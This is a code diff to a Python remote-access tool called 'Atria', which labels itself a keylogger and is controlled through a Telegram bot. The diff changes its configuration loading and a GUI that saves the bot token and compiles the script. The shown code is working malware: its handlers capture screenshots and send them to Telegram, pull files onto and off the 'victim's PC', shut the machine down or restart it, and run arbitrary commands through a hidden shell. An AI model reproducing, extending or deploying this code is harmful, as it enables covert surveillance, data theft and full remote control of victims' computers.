@@ -67,13 +67,23 @@ def get_resource_path():
     
 def load_configuration():
     config_path = get_resource_path()
+    if not os.path.exists(config_path):
+        log_message("Configuration file not found. Creating default configuration.", 'warning')
+        with open(config_path, 'w') as file:
+            file.write("bot_token=\n")
+            file.write("chat_id=\n")
+        return '', ''
     try:
         with open(config_path, 'r') as file:
             config = file.readlines()
-            return config[0].strip().split('=')[1], config[1].strip().split('=')[1]
+            if len(config) < 2:
+                return None, None
+            bot_token = config[0].strip().split('=')[1]
+            chat_id = config[1].strip().split('=')[1]
+            return bot_token, chat_id
     except Exception as e:
         log_message(f"Error loading configuration: {e}", 'error')
-        return None, None
+        return '', ''
 
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                      [Keylogger Main Functions]                                         #
@@ -98,78 +108,87 @@ def start_message():
     send_message("To list all commands, type /help in the chatbox.")
 
 bot_token, chat_id = load_configuration()
-bot = telebot.TeleBot(bot_token) if bot_token and chat_id else None
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
-def send_message(message):
-    if bot:
-        bot.send_message(chat_id, message)
+try:
+    bot = telebot.TeleBot(bot_token) if bot_token else None
+except Exception as e:
+    log_message(f"Error initializing bot: {e}", 'error')
+    bot = None
 
-@bot.message_handler(commands=['help'])
-def send_help(message):
-    help_message = (
-        "Atria Commands\n"
-        "/help - List available commands\n"
-        "/screenshot - Capture and send a screenshot\n"
-        "/upload - Upload file from victim's PC\n"
-        "/download - Download file from victim's PC\n"
-        "/shutdown - Execute shutdown to the victim's PC\n"
-        "/restart - Execute restart to the victim's PC\n"
-        "/shell <command> - Execute commands using a hidden shell"
-    )
-    bot.send_message(message.chat.id, help_message)
+    @retry_on_exception(requests.RequestException, retries=5, delay=2)
+    def send_message(message):
+        if bot:
+            bot.send_message(chat_id, message)
 
-@bot.message_handler(commands=['screenshot'])
-def send_photo(message):
-    if bot:
-        try:
-            screenshot = pyautogui.screenshot()
+    @retry_on_exception(requests.RequestException, retries=5, delay=2)
+    @bot.message_handler(commands=['help'])
+    def send_help(message):
+        help_message = (
+            "Atria Commands\n"
+            "/help - List available commands\n"
+            "/screenshot - Capture and send a screenshot\n"
+            "/upload - Upload file from victim's PC\n"
+            "/download - Download file from victim's PC\n"
+            "/shutdown - Execute shutdown to the victim's PC\n"
+            "/restart - Execute restart to the victim's PC\n"
+            "/shell <command> - Execute commands using a hidden shell"
+        )
+        bot.send_message(message.chat.id, help_message)
 
-            buffer = io.BytesIO()
-            screenshot.save(buffer, format='PNG')
-            buffer.seek(0)
+    @retry_on_exception(requests.RequestException, retries=5, delay=2)
+    @bot.message_handler(commands=['screenshot'])
+    def send_photo(message):
+        if bot:
+            try:
+                screenshot = pyautogui.screenshot()
 
-            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
-            files = {'photo': ('screenshot.png', buffer, 'image/png')}
-            payload = {'chat_id': chat_id}
-            requests.post(url, params=payload, files=files)
-        except Exception as e:
-            log_message(f"Error in send_photo: {e}", 'error')
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format='PNG')
+                buffer.seek(0)
 
-@bot.message_handler(commands=['download'])
-def download_file(message):
-    file_id = message.document.file_id
-    file_info = bot.get_file(file_id)
-    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
-    file_name = message.document.file_name
-    with open(file_name, 'wb') as f:
-        f.write(requests.get(file_url).content)
-    bot.send_message(chat_id, f"File downloaded: {file_name}")
+                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
+                files = {'photo': ('screenshot.png', buffer, 'image/png')}
+                payload = {'chat_id': chat_id}
+                requests.post(url, params=payload, files=files)
+            except Exception as e:
+                log_message(f"Error in send_photo: {e}", 'error')
 
-@bot.message_handler(commands=['shell'])
-def shell_command(message):
-    global current_directory
+    @retry_on_exception(requests.RequestException, retries=5, delay=2)
+    @bot.message_handler(commands=['download'])
+    def download_file(message):
+        file_id = message.document.file_id
+        file_info = bot.get_file(file_id)
+        file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
+        file_name = message.document.file_name
+        with open(file_name, 'wb') as f:
+            f.write(requests.get(file_url).content)
+        bot.send_message(chat_id, f"File downloaded: {file_name}")
 
-    cmd = message.text[7:]
+    @retry_on_exception(requests.RequestException, retries=5, delay=2)
+    @bot.message_handler(commands=['shell'])
+    def shell_command(message):
+        global current_directory
 
-    if cmd.startswith('cd '):
-        try:
-            new_directory = cmd[3:].strip()
-            os.chdir(new_directory)
-            current_directory = os.getcwd()
-            output = f"Changed directory to {current_directory}"
-        except Exception as e:
-            output = f"Error: {e}"
-    else:
-        try:
-            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
-            output = output.decode('utf-8')
-        except subprocess.CalledProcessError as e:
-            output = f"Error: {e.output.decode('utf-8')}"
-        except Exception as e:
-            output = f"Error: {e}"
+        cmd = message.text[7:]
 
-    bot.send_message(message.chat.id, output)
+        if cmd.startswith('cd '):
+            try:
+                new_directory = cmd[3:].strip()
+                os.chdir(new_directory)
+                current_directory = os.getcwd()
+                output = f"Changed directory to {current_directory}"
+            except Exception as e:
+                output = f"Error: {e}"
+        else:
+            try:
+                output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
+                output = output.decode('utf-8')
+            except subprocess.CalledProcessError as e:
+                output = f"Error: {e.output.decode('utf-8')}"
+            except Exception as e:
+                output = f"Error: {e}"
+
+        bot.send_message(message.chat.id, output)
 
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                 [Continuation of Keylogger Functions]                                   #
@@ -289,10 +308,10 @@ class BotConfigGUI(QWidget):
 
         self.token_label = QLabel('Bot Token:')
         self.token_input = QLineEdit(self)
-        self.token_input.setText(self.config[0])
+        self.token_input.setText(self.config[0] if self.config[0] else '')
         self.chat_id_label = QLabel('Chat ID:')
         self.chat_id_input = QLineEdit(self)
-        self.chat_id_input.setText(self.config[1])
+        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
         self.save_button = QPushButton('Save Configuration', self)
         self.compile_button = QPushButton('Compile Script', self)
         self.save_button.clicked.connect(self.save_configuration)
@@ -311,10 +330,15 @@ class BotConfigGUI(QWidget):
         try:
             bot_token = self.token_input.text()
             chat_id = self.chat_id_input.text()
-            with open(BOT_TOKEN_FILE, 'w') as file:
-                file.write(f"bot_token={bot_token}\n")
-                file.write(f"chat_id={chat_id}\n")
-            QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
+
+            if bot_token and chat_id:
+                config_path = get_resource_path()
+                with open(config_path, 'w') as file:
+                    file.write(f"bot_token={bot_token}\n")
+                    file.write(f"chat_id={chat_id}\n")
+                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
+            else:
+                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
         except Exception as e:
             QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')
 
